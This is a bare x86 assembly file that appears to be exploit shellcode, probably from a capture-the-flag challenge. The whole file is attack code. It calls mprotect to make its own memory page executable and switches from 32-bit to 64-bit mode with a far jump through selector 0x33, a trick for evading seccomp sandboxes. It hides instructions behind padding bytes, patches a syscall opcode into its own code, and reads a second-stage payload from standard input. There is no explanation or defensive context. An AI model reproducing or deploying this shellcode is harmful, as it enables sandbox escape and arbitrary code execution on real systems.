    bits 32
    org 0x1337005
    default rel
    global _start

_start:
    mov eax, 10
    mov edi, 0x1337000
    mov esi, 0x1000
    mov edx, 7
    jmp far 0x33:mode64

    bits 64
mode64:
    db 0x48, 0xb9
    dd 0
    dw 0
    db 0x66, 0xb9
    syscall
    mov ebx, trigger
    mov eax, 0
    mov edi, 0
    mov esi, after
    mov edx, 0x100
    mov ecx, 0x050f
    mov dword [ebx], ecx
trigger:
    dw 0
after: